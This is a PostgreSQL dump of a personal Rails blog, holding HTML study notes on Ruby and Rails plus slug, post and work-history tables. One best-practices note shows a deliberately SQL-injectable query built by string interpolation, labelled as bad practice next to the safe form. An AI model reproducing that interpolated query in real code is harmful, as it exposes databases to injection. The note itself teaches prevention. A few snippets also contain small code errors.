:customer\r\n\r\n# Relation with cascade delete\r\nhas_many :invoices, dependent: :destroy\r\n\r\n#One to one\r\nhas_one :profile\r\n\r\n# Hook methods \r\nbefore_destroy :ensure_not_reference_by_any_invoices \r\nbefore_save :downcase_email \r\n\r\n# create virtual password and password_confirmation \r\n# and bcrypt password_digest\r\n# add method to model: user.authenticate(params[:password])\r\nhas_secure_password</pre><div>\n<br><strong>Active Record</strong>\n</div><pre class="language-rb"># Active record common methods\r\nArticle.all\r\n# Throw error if not found\r\nArticle.find(params[:id])\r\n# Do not throw error if not found\r\nArticle.find_by(product_id: product_id)\r\n@category = Category.find_by!(slug: params['slug']) # Return Not Found Error (404 page in production)\r\nArticle.group(:product_id).sum(:quantity)\r\nArticle.where('quantity &gt; 1')\r\nArticle.where(cat_id: cat_id, model: model)\r\nArticle.where(model: model).or(Article.where(cat_id: cat_id))\r\nArticle.join(:categories).where(categories: { id: 2 } )\r\nArticle.where("title LIKE ?", "%" + params[:q] + "%")\r\nArticle.count\r\nArticle.first\r\nArticle.last\r\nArticle.column_names # ['id', 'name', 'price']\r\nCategory.delete_all # delete all rows in Category table\r\nproduct.category = Category.all.sample # random for Faker data\r\n@products = Product.offset(5).limit(10).all # skip 5, take 10</pre><div><strong>Controllers</strong></div><pre class="language-rb"># Hook before running any code\r\nbefore_action :set_post, only: [:show, :edit, :update, :destroy]\r\n\r\n# If you use Devise (authentification)\r\nbefore_action :authenticate_user!\r\n\r\n# 7 Restfull action short exemple \r\ndef index\r\n  # Search input name :q\r\n  if session[:q].present?\r\n    params[:page] = 1\r\n    # Create instance variable @\r\n    @posts = Post.where "title like ?", "%" + session[:q] + "%"\r\n  else\r\n    @posts = Post.all\r\n  end\r\n  @posts = @posts.order("created_at DESC")\r\n  # Pagination with will_paginate gem\r\n  @posts = @posts.paginate(page: params[:page], per_page: 3)\r\n  session[:q] = nil\r\nend\r\n\r\n# By convention all action (even empty one)\r\n# run hook before_action and render view template\r\ndef show\r\nend\r\n\r\ndef new\r\n  @post = Post.new\r\nend\r\n\r\ndef edit\r\nend\r\n\r\ndef create\r\n  @post = Post.new(post_params)\r\n    if @post.save\r\n      redirect_to @post, notice: 'Created successfully!'\r\n    else\r\n      render :new \r\n    end\r\nend\r\n\r\ndef update\r\n  if @post.update(post_params)\r\n      redirect_to @post, notice: 'Updated successfully!'\r\n    else\r\n      render :edit \r\n    end\r\nend\r\n\r\n  def destroy\r\n    @post.destroy\r\n    redirect_to posts_url, notice: 'Delete successfully!' \r\n  end\r\n\r\nprivate\r\n  # Use callbacks to share common methods between actions.\r\n  def set_post\r\n    @post = Post.find(params[:id])\r\n  end\r\n\r\n  # Only allow a list of trusted parameters through.\r\n  def post_params\r\n    params.require(:post).permit(:title, :body, :image_url)\r\n  end\r\nend\r\n\r\n# render text\r\nrender plain: 'Hello User'</pre><div><strong>Form</strong></div><pre class="language-rb">&lt;%# Model form %&gt;\r\n&lt;%= form_with(model: product), local: true do |form| %&gt;\r\n  &lt;%= form.label :title %&gt;\r\n  &lt;%= form.text_field :title, class: 'form-control' %&gt;\r\n\r\n  &lt;%= form.submit %&gt;\r\n&lt;% end %&gt;\r\n\r\n&lt;%# Generic form %&gt;\r\n&lt;%= form_with url: "/search", method: :get, local: true do |form| %&gt;\r\n  &lt;%= form.label :query, "Search for:" %&gt;\r\n  &lt;%= form.text_field :query, placeholder: 'search' %&gt;\r\n  &lt;%= form.submit "Search", class: 'btn btn-primary' %&gt;\r\n&lt;% end %&gt;\r\n\r\n&lt;%# Multi-lines memo %&gt;\r\n&lt;%= form.text_area :description, rows: 10, cols: 60 %&gt;\r\n\r\n&lt;%# Collection Select (field, collection, key, value, label) %&gt;\r\n&lt;%= form.collection_select :category_id, Category.all, :id, :name, {include_blank: '- Select a Category -'}, {class: 'form-select'}\r\n\r\n&lt;%# Select %&gt;\r\n&lt;%= form.select :type, Customer.types.keys, prompt: 'Select a type' %&gt;\r\n&lt;%= form.select :rating, (1..5) %&gt;\r\n\r\n&lt;%# if form in new or edit mode change submit text %&gt; \r\n&lt;%= form.submit @product.new_record? ? 'Create' : 'Update', class: "mt-4 btn btn-primary" %&gt;</pre>	Post	54	2021-08-17 07:52:25.811838	2021-08-17 08:00:45.548434
65	body	<div>The yield keyword, when used inside the body of a method, will allow you to call that method with a block and pass, or "yield", to that block. Think of the yield keyword as saying "stop executing the code in this method and instead execute the code in the block. Then, return to the code in the method."</div><div><br></div><div><strong>At most one block can appear in an argument list</strong></div><div><br></div><pre class="language-rb">def yielding\r\n  puts "the program is executing the code inside the method"\r\n  yield\r\n  puts "now we are back in the method"\r\nend</pre><div>\n<br><strong>To call this method with a block, we use the following syntax: </strong>\n</div><pre class="language-rb">yielding {puts "the method has yielded to the block!"}</pre><div><strong>or</strong></div><pre class="language-rb">yielding do \r\n  puts "the method has yielded to the block!"\r\nend</pre><div>When we call yielding with the above block, we will output:</div><div>"the program is executing the code inside the method"<br>"the method has yielded to the block!"<br>"now we are back in the method"</div><div><br></div><div>\n<strong>block_given?</strong> Can be used to check if block is passed</div><pre class="language-rb">def do_something_with_block\r\n  return "No block given" unless block_given?\r\n  yield\r\nend</pre>	Post	56	2021-08-19 21:04:53.702559	2021-08-19 21:05:53.693139
66	body	<div>\n<strong>map<br></strong>Performs an action on each array element. The original array is not modified. Returns the modified array.</div><pre class="language-rb">[1,2,3,4,5,6,7,8,9,10].map{|e| e*3 }\r\n# returns [3, 6, 9, 12, 15, 18, 21, 24, 27, 30]</pre><div><br></div><div>\n<strong>each<br></strong>Executes an action using as parameter each element of the array. Returns the unmodified array.</div><pre class="language-rb">[1,2,3,4,5,6,7,8,9,10].each{|e| print e.to_s+"!" }\r\n# prints "1!2!3!4!5!6!7!8!9!10!"\r\n# returns [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] </pre><div><strong><br>collect</strong></div><div>Alias for map</div><div><strong><br>inject</strong></div><div>Takes an accumulator (sum) and changes it as many times as there are elements in the array. Returns the final value of the accumulator.</div><pre class="language-rb">[1,2,3,4,5,6,7,8,9,10].inject{|sum,e| sum += e }\r\n# returns 55</pre><div>You can also specify an <strong>initial value</strong> as a parameter before the block.</div><pre class="language-rb">["bar","baz","quux"].inject("foo") {|acc,elem| acc + "!!" + elem }\r\n# returns "foo!!bar!!baz!!quux" </pre><div><strong><br>reduce</strong></div><div>\n<strong>Alias for </strong><strong><em>inject</em></strong>\n</div><pre class="language-rb">## This is for product, with no initial value stated\r\n[1, 2, 3, 4, 5].inject(:*)\r\n#=&gt; 120 ### This is for sum, with an initial value of 5\r\n[1, 2, 3, 4, 5].reduce(5, :+)\r\n#=&gt; 20</pre>	Post	57	2021-08-19 21:09:48.825481	2021-08-19 21:10:16.698663
67	body	<div>Method overloading can be achieved by declaring two methods with the same name and different signatures. These different signatures can be either due to different data types or a different number of arguments.</div><div>In ruby, there can be only one method with a given name. If there are <strong>multiple methods with the same name</strong>, the <strong>last one prevails</strong> i,e the last method will be invoked when called.</div><div><br></div>	Post	58	2021-08-19 21:11:24.821922	2021-08-19 21:11:24.821922
68	body	<ul>\n<li>It is more like a string than variable</li>\n<li>In Ruby string is mutable but a Symbol is immutable</li>\n<li>Only one copy of the symbol requires to be created</li>\n<li>Symbols are often used as the corresponding to enums in Ruby</li>\n</ul><div><br></div>	Post	59	2021-08-19 21:12:02.516752	2021-08-19 21:12:02.516752
69	body	<div>The first place that Ruby looks for a method is in the <strong>object’s metaclass</strong> or eigenclass—the class that contains methods directly defined on the object.</div><div>If the method cannot be found in an object’s metaclass, Ruby will then <strong>search for the method in the ancestors of an object’s class</strong>. The list of ancestors for any class starts <strong>with the class of the object itself</strong>, and climbs parent classes until it reaches the Object, Kernel, and <strong>BasicObject</strong> classes at the top of the Ruby class hierarchy.</div><div>If Ruby cannot find the method, it will internally send another method aptly called “<strong>method_missing</strong>?”<strong> to the object class</strong>. Ruby will repeat another search for this method, and will at least find it in the object class, provided the programmer did not see fit to define the “method_missing?” class earlier in the ancestry of the object.</div><div><br></div><div>\n<strong>Hierarchy of ruby method lookup?<br></strong><br>\n</div><div>Precedence of ruby methods goes like this:</div><ol>\n<li>‘singleton’ methods</li>\n<li>‘extend’ methods</li>\n<li>‘prepend’ methods</li>\n<li>‘instance’ methods</li>\n<li>‘include’ methods</li>\n<li>‘inherited’ methods</li>\n</ol>	Post	60	2021-08-19 21:12:35.730228	2021-08-19 21:12:35.730228
70	body	<div>You can actually reopen any class and change how it works. Classes that have been Monkey Patched are more difficult to understand and debug.</div><pre class="language-rb">class String  \r\n  def self.lipsum  \r\n  "Lorem ipsum dolor sit amet, consectetur adipiscing elit."  \r\n  end  \r\nend \r\nString.lipsum  \r\n=&gt; "Lorem ipsum dolor sit amet, consectetur adipiscing elit." </pre><div><br></div><div><strong>Disadvantages of Monkey Patching</strong></div><ul>\n<li>If two libraries monkey-patch the same method, the first monkey-patch will get overwritten and disappear forever.</li>\n<li>If there’s an error, it’ll look like the error happened inside the class.</li>\n<li>It’s harder to turn off your monkey patches.</li>\n<li>If you, say, forgot to require ‘class’ before running this monkey patch, you’ll accidentally redefine the class instead of patching it.</li>\n<li>Instead, you could put your monkey patches in a module, but both variants have the same problem: the patch is global and your changes could unexpectedly be overwritten by the third library.</li>\n</ul><pre class="language-rb">module CoreExtensions\r\n  module DateTime\r\n    module BusinessDays\r\n      def weekday?\r\n        !sunday? &amp;&amp; !saturday?\r\n      end\r\n    end\r\n  end\r\nend</pre><div>This way, you can organize related monkey patches together. When there’s an error, it’s clear exactly where the problem code came from. And you can include them one group at a time:</div><div># Actually monkey-patch DateTime<br>DateTime.include CoreExtensions::DateTime::BusinessDays</div><div><br></div><div><strong>refine and using Methods in Ruby</strong></div><div>The Module#refine method allows you to <strong>register a monkey-patch for a specific class</strong> that can be applied whenever we want by calling the Module#using methods. </div><pre class="language-rb">module TemporaryPatch\r\n  refine Hash do\r\n    def to_s\r\n      ''\r\n    end\r\n  end\r\nend\r\n\r\nlolcat = { lol: 'cat' }\r\np lolcat.to_s   # =&gt; "{\\"lol\\": \\"cat"\\}"\r\n\r\nusing TemporaryPatch\r\n\r\np lolcat.to_s   # =&gt; ""</pre><div><br></div><div>By calling the Module#refine method, we register and activate a refinement for the Hash class.</div><div>Note that this method <strong>only accepts a class</strong> (and not a module) as an argument. This argument indicates to which class the patch is applied.</div>	Post	61	2021-08-19 21:13:28.946753	2021-08-19 21:13:52.228656
71	body	<div><strong>==   generic "equality"</strong></div><div>At the Object level, == returns true only if obj and other are the same object. Typically, this method is overridden in descendant classes to provide class-specific meaning.</div><div><strong>Ruby uses :== everywhere to compare the values of 2 objects, eg. Hash-values:</strong></div><pre class="language-rb">{a: 'z'} == {a: 'Z'} # =&gt; false\r\n{a: 1} == {a: 1.0} # =&gt; true</pre><div><br></div><div>\n<strong>=== is the pattern matching operator!</strong><br>=== matches regular expressions</div><ul>\n<li>=== checks range membership</li>\n<li>=== checks being instance of a class</li>\n<li>=== calls lambda expressions</li>\n<li>=== sometimes checks equality, but mostly it does not</li>\n</ul><div><br></div><div>Some examples</div><pre class="language-rb">case value \r\nwhen /regexp/ \r\n  # value matches this regexp \r\nwhen 4..10 \r\n  # value is in range \r\nwhen MyClass \r\n  # value is an instance of class \r\nwhen -&gt;(value) { ... } \r\n  # lambda expression returns true \r\nwhen a, b, c, d \r\n  # value matches one of a through d with `===` \r\nwhen *array \r\n  # value matches an element in array with `===` \r\nwhen x \r\n  # values is equal to x unless x is one of the above end</pre><div><br></div><div>\n<strong>eql? (Hash-key comparison)<br></strong>Ruby uses :eql? (in combination with the method hash) to <strong>compare Hash-keys</strong>. In most classes :eql? is identical with :==.</div><div><br></div><pre class="language-rb">"zen".eql? "zen" # Output: =&gt; true \r\n# is the same as \r\n"zen".hash == "zen".hash \r\n# Output: =&gt; true</pre><div>In most cases, the eql? method behaves similarly to the == method. However, there are a few exceptions. For instance, eql? does not perform implicit type conversion when comparing an integer to a float.</div><div>2 == 2.0 # Output: =&gt; true </div><div>2.eql? 2.0 # Output: =&gt; false </div><div>2.hash == 2.0.hash # Output: =&gt; false</div><div><br></div><div>\n<strong>equal? (object identity comparison)<br></strong><br>Ruby uses :equal? to check if <strong>two objects are identical</strong>. This method (of class BasicObject) is not supposed to be overwritten. </div><div>Unlike the == operator which tests if both operands are equal, the equal method checks if the two operands refer to the same object. This is the <strong>strictest form of equality</strong> in Ruby.</div><div><br></div><pre class="language-rb">obj = obj2 = 'a'\r\nobj.equal? obj2 # =&gt; true\r\nobj.equal? obj.dup # =&gt; false</pre>	Post	62	2021-08-19 21:15:21.323452	2021-08-19 21:18:32.184032
72	body	<div>Use <strong>locks</strong> to ensure that a critical piece of code only runs in a single thread at the same time. A lock is also called a "<strong>mutex</strong>".</div><div>Let's say two users try to transfer 5 units of currency from the same source account to the same target account. Here is what can happen:</div><ul>\n<li>Thread A retrieves both accounts. It sees that source_account and target_account both have a balance of 100.</li>\n<li>Thread B retrieves both accounts. It sees that source_account and target_account both have a balance of 100.</li>\n<li>Thread A sets source_account.balance to 95 and target_account.balance to 105.</li>\n<li>Thread A saves both accounts and terminates.</li>\n<li>Thread B also sets source_account.balance to 95 and increases target_account.balance to 105.</li>\n<li>Thread B saves both accounts and terminates.</li>\n</ul><div>We just lost the first money transfer. The account balances should be 90 and 110, but they are 95 and 105. We call this the "<strong>lost update problem</strong>". You cannot fix this with a <strong>transaction. </strong>What you should do instead is to wrap critical code in a <strong>lock</strong>. The lock ensures only a single thread may access it at a single time</div><div>\n<br><strong>Optimistic Locking</strong>\n</div><div>In this kind of locking, multiple users can access the same object to read its value but if two users perform the conflicting update, only one user will succeed and the other one will get an exception.</div><pre class="language-rb">p1 = Person.find(1)\r\np2 = Person.find(1)\r\n\r\np1.first_name = "Michael"\r\np1.save\r\n\r\np2.first_name = "should fail"\r\np2.save # Raises a ActiveRecord::StaleObjectError</pre><div><br></div><div>To create Optimistic locking, you can create a <strong>lock_version</strong> column in the model you want to place the lock and Rails will automatically check this column before updating the object. Its mechanism is pretty simple. Every time the object is updated, <strong>lock_version</strong> value will be increased. Therefore, if two requests want to perform the same object, the first request will be successful because its <strong>lock_version</strong> is the same as when it is read. But the second request would fail because <strong>lock_version</strong> has already been increased in the database by the first request.</div><div><br></div><div><strong>Pessimistic Locking</strong></div><div>With this kind of locking, only the first user accessed to the object will be able to update it. <strong>All other users will be excluded from even reading the object</strong> (remember that in Optimistic locking, we only lock it when updating the data and users are still able to read it).</div><div>Rails implements Pessimistic Locking by issuing special queries in the database. For example, suppose you want to retrieve account object and lock it until you finish updating</div><pre class="language-rb">account = Account.find_by_user_id(5)\r\naccount.lock!\r\n#no other users can read this account, they have to wait until the lock is released\r\naccount.save! \r\n#lock is released, other users can read this account</pre><div><br></div><div>You can start a transaction and acquire the lock in one go by calling <strong>with_lock</strong> with a block. The block is called from within a transaction, the object is already locked. Example:</div><pre class="language-rb">account = Account.first\r\naccount.with_lock do\r\n  # This block is called within a transaction,\r\n  # The account is already locked.\r\n  account.balance -= 100\r\n  account.save!\r\nend</pre><div><br></div>	Post	63	2021-08-19 21:20:55.699	2021-08-19 21:21:51.862193
74	body	<div><strong>Count</strong></div><div>Count will <strong>perform a SQL count query</strong>.</div><pre class="language-rb">Book.count\r\n(0.2ms)  SELECT COUNT(*) FROM "books"\r\n=&gt; 100</pre><div><br></div><div>If a query has been performed to get the entries from the database and stored in a variable, calling count <strong>will perform another query</strong>.</div><pre class="language-rb">books = Book.all\r\nBook Load (1.3ms)  SELECT "books".* FROM "books"\r\nbooks.count\r\n(0.2ms)  SELECT COUNT(*) FROM "books"\r\n=&gt; 100</pre><div>In this case, the count is fast but if the query is complex this could cause performance issues.</div><div><br></div><div><strong>Length</strong></div><div>Length, on the other hand, will run the query up until the point of reaching length then calculate the number of items in the array.</div><div>This always <strong>loads the contents of the association into memory,</strong> then returns the number of elements loaded. </div><pre class="language-rb">Book.all.length\r\nBook Load (1.3ms)  SELECT "books".* FROM "books"\r\n=&gt; 100\r\nbooks = Book.all\r\nBook Load (1.3ms)  SELECT "books".* FROM "books"\r\nbooks.length\r\n=&gt; 100</pre><div>Here <strong>no separate count query is performed</strong> in either of these cases.</div><div><br></div><div><strong>size</strong></div><div>size is another method that can be used. It will determine which method between count and length to call. If you have <strong>already loaded </strong>the entries<strong> it will use length</strong>. If you haven’t it will use count. Size can  be used in most cases to save you having to worry about any of the performance considerations.</div>	Post	65	2021-08-19 21:25:41.536903	2021-08-19 21:26:06.600873
73	body	<div><strong>Prevent SQL Injection</strong></div><pre class="language-rb">#Bad Practice\r\nUser .where("name = #{params[:name]}")\r\n\r\n#Good Practice\r\nUser.where("name = ?", params[:name])\r\nUser.where(:name =&gt; params[:name])</pre><div><strong>Avoid the n+1 Problem</strong></div><div>Use Bullet gem to detect n+1 problems</div><div>\n<br><strong>Model</strong>\n</div><ol>\n<li>The law of Demeter</li>\n<li>Use observer</li>\n<li>Use query attribute</li>\n<li>Remove unused methods in models</li>\n<li>Protect mass assignment</li>\n</ol><div><strong>View</strong></div><ol>\n<li>Move code into controller or model or helper</li>\n<li>Replace instance variable with local variable</li>\n<li>Simplify render in views</li>\n</ol><div>\n<br>To be continued...</div>	Post	64	2021-08-19 21:22:46.295038	2021-08-19 21:24:56.006988
\.


--
-- Data for Name: active_storage_attachments; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.active_storage_attachments (id, name, record_type, record_id, blob_id, created_at) FROM stdin;
\.


--
-- Data for Name: active_storage_blobs; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.active_storage_blobs (id, key, filename, content_type, metadata, service_name, byte_size, checksum, created_at) FROM stdin;
\.


--
-- Data for Name: active_storage_variant_records; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.active_storage_variant_records (id, blob_id, variation_digest) FROM stdin;
\.


--
-- Data for Name: ar_internal_metadata; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.ar_internal_metadata (key, value, created_at, updated_at) FROM stdin;
environment	production	2021-08-07 12:30:25.268783	2021-08-07 12:30:25.268783
schema_sha1	e1a6b39f50ba932d92b410d46eddafe250919404	2021-08-07 12:30:25.284687	2021-08-07 12:30:25.284687
\.


--
-- Data for Name: bookmarks; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.bookmarks (id, bookmarkable_type, bookmarkable_id, user_id, created_at, updated_at) FROM stdin;
\.


--
-- Data for Name: experiences; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.experiences (id, company, location, title, description, start_date, end_date, working_here, user_id, created_at, updated_at, avatar, company_link, company_heading, image_url) FROM stdin;
1	Bed Bath & Beyond (Intersoft Data Labs)	Gurugram, India	Sr. Technical Analyst	\N	2019-02-10	\N	t	1	2021-08-07 18:51:47.703914	2021-08-10 12:50:04.543073	\N	https://www.linkedin.com/company/intersoft-data-labs/		https://media-exp1.licdn.com/dms/image/C4D0BAQGoqlceYzt6Sw/company-logo_200_200/0/1593715796231?e=1636588800&v=beta&t=F6YZlM-izmFQgOCAgi3GN3U8IrBd3DdMeA0Q0Jv4jJg
2	KiwiTech	Noida Area, India	Software Engineer (Ruby on Rails)	\N	2017-10-28	2019-02-14	f	1	2021-08-07 18:53:13.360216	2021-08-10 12:50:24.412788	1528443245244.jpeg	https://www.linkedin.com/company/kiwitech/		https://media-exp1.licdn.com/dms/image/C510BAQFwIQPqBkZaFg/company-logo_200_200/0/1528443245244?e=1636588800&v=beta&t=8ydihUutBLpEHs0Jbzir1yfCGvaS65JJBKzTWCGqD48
3	Navyug Infosolutions Pvt. Ltd.	Noida	Software Developer	\N	2015-08-09	2017-10-27	f	1	2021-08-07 18:54:17.49741	2021-08-10 12:50:46.207239	1519869074390.png	https://www.linkedin.com/company/navyug-infosolutions-pvt-ltd-/		https://media-exp1.licdn.com/dms/image/C560BAQFKstIbXKbvgA/company-logo_200_200/0/1519869074390?e=1636588800&v=beta&t=bjY3aQyXC06UXy5ryNqDU2UWpfifJP8cquQyQh7XA2Y
4	Way2iTech		Tutor & Freelancer	\N	2014-06-07	2015-06-01	f	1	2021-08-16 22:41:31.931042	2021-08-16 22:42:58.483982	\N			https://media-exp1.licdn.com/dms/image/C560BAQGGnROaeeN-JQ/company-logo_200_200/0/1519910992028?e=1637193600&v=beta&t=kOXkzC9vDuZygbHCnXBnJubWNcYbTm0VUaSuiq-y0Ac
5	Autodesk	Pune, India	Technical Intern	\N	2014-01-07	2014-05-30	f	1	2021-08-16 22:45:25.923743	2021-08-16 22:45:25.932874	\N	https://www.linkedin.com/company/autodesk/		https://media-exp1.licdn.com/dms/image/C4E0BAQFOGIiE0C47_g/company-logo_200_200/0/1625124002082?e=1637193600&v=beta&t=zuZZbXls2Am3tNX__Q74NijW-vhSKvgxc6_w2ENXyN8
\.


--
-- Data for Name: friendly_id_slugs; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.friendly_id_slugs (id, slug, sluggable_id, sluggable_type, scope, created_at) FROM stdin;
1	aman	1	Post	\N	2021-08-07 12:40:39.524346
2	new-in-rails-6	1	Post	\N	2021-08-07 20:22:11.542985
3	new-in-rails-5	2	Post	\N	2021-08-07 20:23:47.569669
4	new-in-rails-4	3	Post	\N	2021-08-07 20:25:23.663245
5	mention-what-are-the-positive-aspects-of-rails	4	Post	\N	2021-08-07 20:25:55.596217
6	polymorphic-association	5	Post	\N	2021-08-07 20:27:07.658239
7	cons-of-polymorphic-relation	6	Post	\N	2021-08-07 20:27:55.237906
8	self-joins	7	Post	\N	2021-08-07 20:42:26.96147
9	tinyurl-system	8	Post	\N	2021-08-09 06:30:13.027501
10	how-to-find-all-pairs-on-an-integer-array-whose-sum-is-equal-to-the-given-number	9	Post	\N	2021-08-09 06:33:33.257135
11	forward-proxy	10	Post	\N	2021-08-09 07:14:27.904423
12	reverse-proxy	11	Post	\N	2021-08-09 07:16:04.224487
13	rate-limiting	12	Post	\N	2021-08-09 07:17:48.404857
14	bubble-sort	13	Post	\N	2021-08-09 07:50:34.560714
15	insertion-sort	14	Post	\N	2021-08-09 08:23:54.438922
16	selection-sort	15	Post	\N	2021-08-09 08:31:37.421735
17	cookies-vs-localstorage	16	Post	\N	2021-08-09 08:39:44.776781
18	security-vulnerabilities	17	Post	\N	2021-08-09 08:41:14.723549
19	check-if-two-strings-are-anagrams-of-each-other	18	Post	\N	2021-08-09 13:05:18.545583
20	acid-properties	19	Post	\N	2021-08-09 20:15:48.821824
21	database-joins	20	Post	\N	2021-08-09 20:18:37.335457
22	find-the-nth-highest-salary-in-sql	21	Post	\N	2021-08-09 20:20:23.090837
23	what-is-scope-chaining-in-javascript	22	Post	\N	2021-08-09 21:57:24.027732
24	prepend	23	Post	\N	2021-08-10 21:33:38.325226
25	super-vs-super	24	Post	\N	2021-08-10 21:35:24.423795
26	splat-operator	25	Post	\N	2021-08-10 21:37:21.313854
27	single-table-inheritance	26	Post	\N	2021-08-11 08:35:41.233171
28	activerecord-scope	27	Post	\N	2021-08-11 08:39:34.46975
29	default_scope	28	Post	\N	2021-08-11 08:42:17.557922
30	how-is-it-possible-to-call-class-methods-on-mailers-even-though-you-define-instance-methods	29	Post	\N	2021-08-11 08:44:25.469831
31	high-level-rails-request-response-cycle	30	Post	\N	2021-08-11 08:46:51.841938
32	locking-mechanism	31	Post	\N	2021-08-11 08:48:46.096359
33	why-order-by-with-limit-and-offset-is-slow	32	Post	\N	2021-08-11 08:50:20.002732
34	postgres-vacuum	33	Post	\N	2021-08-11 08:51:03.535486
35	window-functions	34	Post	\N	2021-08-11 08:52:40.098068
36	load-balancer	35	Post	\N	2021-08-11 08:53:57.589843
37	types-of-load-balancers	36	Post	\N	2021-08-11 08:54:48.603672
38	elevator-system-design	37	Post	\N	2021-08-11 08:58:50.001961
39	is-monotonic	38	Post	\N	2021-08-11 09:02:32.461988
40	longest-mountain-in-array	39	Post	\N	2021-08-11 09:03:56.567985
41	cdn-content-delivery-network	40	Post	\N	2021-08-11 21:24:02.892954
42	choosing-the-best-database-in-a-system-design	41	Post	\N	2021-08-11 21:26:06.915471
43	horizontal-vs-vertical-scaling	42	Post	\N	2021-08-11 21:27:12.638462
44	http-1-0	43	Post	\N	2021-08-11 21:35:51.888419
45	http-1-1	44	Post	\N	2021-08-11 21:36:11.731594
46	http-2	45	Post	\N	2021-08-11 21:36:29.050368
47	http-3-http-2-over-quic	46	Post	\N	2021-08-11 21:37:17.337962
48	poison-and-rat-puzzle	47	Post	\N	2021-08-11 21:40:55.560099
49	red-blue-lottery-puzzle	48	Post	\N	2021-08-11 21:41:55.489224
50	russian-doll-caching	49	Post	\N	2021-08-11 21:45:20.655093
51	nil-vs-empty-vs-blank	50	Post	\N	2021-08-11 21:49:01.651011
52	vs-and-vs-or	51	Post	\N	2021-08-11 21:51:34.403922
53	http-caching	52	Post	\N	2021-08-13 13:07:20.880943
54	cross-origin-resource-sharing-cors	53	Post	\N	2021-08-13 13:08:46.198954
55	rails-cheat-sheet	54	Post	\N	2021-08-17 07:52:25.873407
57	yield-keyword	56	Post	\N	2021-08-19 21:04:53.796357
58	map-each-collect-inject-reduce	57	Post	\N	2021-08-19 21:09:48.844249
59	why-doesn-t-ruby-support-method-overloading	58	Post	\N	2021-08-19 21:11:24.834804
60	symbol-vs-string	59	Post	\N	2021-08-19 21:12:02.531056
61	ruby-method-lookup	60	Post	\N	2021-08-19 21:12:35.744262
62	monkey-patching	61	Post	\N	2021-08-19 21:13:28.958772
63	vs-eql-equal	62	Post	\N	2021-08-19 21:15:21.343521
64	locks-in-rails	63	Post	\N	2021-08-19 21:20:55.713248
65	rails-best-practices	64	Post	\N	2021-08-19 21:22:46.306923
66	activerecord-count-vs-length-vs-size	65	Post	\N	2021-08-19 21:25:41.551036
67	rails-migrations-cheat-sheet	66	Post	\N	2021-08-19 21:27:41.313441
68	difference-between-rake-db-migrate-db-reset-and-db-schema-load	67	Post	\N	2021-08-19 21:31:12.089293
69	hash-vs-hashwithindifferentaccess	68	Post	\N	2021-08-19 21:31:37.12714
70	csrf-cross-site-request-forgery-in-rails	69	Post	\N	2021-08-19 21:32:07.913085
\.


--
-- Data for Name: item_images; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.item_images (id, image, caption) FROM stdin;
\.


--
-- Data for Name: item_texts; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.item_texts (id, description) FROM stdin;
\.


--
-- Data for Name: item_twitters; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.item_twitters (id, twitter_id) FROM stdin;
\.


--
-- Data for Name: items; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.items (id, post_id, sort_rank, target_type, target_id, created_at, updated_at) FROM stdin;
\.


--
-- Data for Name: likes; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.likes (id, likeable_type, likeable_id, user_id, created_at, updated_at) FROM stdin;
\.


--
-- Data for Name: posts; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.posts (id, title, body, likes_count, published_at, featured, picture, created_at, updated_at, user_id, slug, responses_count, lead, meta_keywords, meta_description, language, view_count) FROM stdin;
16	Cookies vs LocalStorage	\N	0	2021-08-09 08:39:44.613667	f	\N	2021-08-09 08:39:44.681869	2021-08-09 08:39:44.72634	1	cookies-vs-localstorage	0					0
3	New in Rails 4	\N	0	2021-08-09 07:11:03.272837	f	\N	2021-08-07 20:25:23.60852	2021-08-09 07:11:03.422565	1	new-in-rails-4	0					0
17	Security vulnerabilities	\N	0	2021-08-09 08:41:14.471418	f	\N	2021-08-09 08:41:14.650947	2021-08-09 08:41:14.712386	1	security-vulnerabilities	0					0
1	New in rails 6	\N	0	2021-08-07 20:23:00.436176	f	\N	2021-08-07 12:40:39.495866	2021-08-07 20:23:00.497432	1	new-in-rails-6	0	<div>Rails 6 requires Ruby <strong>2.5+</strong>\n</div>\n	\N	\N	\N	0
2	New in rails 5	\N	0	2021-08-07 20:23:47.479105	f	\N	2021-08-07 20:23:47.518759	2021-08-07 20:23:47.549749	1	new-in-rails-5	0	<div>Rails 4 requires Ruby 1.9.3 or higher and prefers Ruby 2.0 while Rails 5 only work with Ruby <strong>2.2.1</strong>\n</div>\n	\N	\N	\N	0
4	Mention what are the positive aspects of Rails?	\N	0	2021-08-07 20:25:55.465966	f	\N	2021-08-07 20:25:55.528189	2021-08-07 20:25:55.56132	1	mention-what-are-the-positive-aspects-of-rails	0	<div>Rails provide many features like</div>\n	\N	\N	\N	0
5	Polymorphic Association	\N	0	2021-08-10 21:35:49.558884	f	\N	2021-08-07 20:27:07.596942	2021-08-10 21:35:49.603923	1	polymorphic-association	0	<div>Polymorphic Association allows an ActiveRecord object to be connected with Multiple ActiveRecord objects. A perfect example of the Polymorphic Association is a social site where users can comment on anywhere whether it is videos, photos, links, status updates etc. It would not be feasible if you have to create an individual comment like photos_comments, videos_comment and so on.</div>			rb	0
6	Cons of Polymorphic relation	\N	0	2021-08-07 20:27:55.104243	f	\N	2021-08-07 20:27:55.146991	2021-08-07 20:27:55.200926	1	cons-of-polymorphic-relation	0	<div><br></div>	\N	\N	\N	0
10	Forward proxy	\N	0	2021-08-09 07:14:27.798629	f	\N	2021-08-09 07:14:27.843307	2021-08-09 07:14:27.882771	1	forward-proxy	0					0
11	Reverse proxy	\N	0	2021-08-09 07:16:04.109784	f	\N	2021-08-09 07:16:04.163318	2021-08-09 07:16:04.18966	1	reverse-proxy	0					0
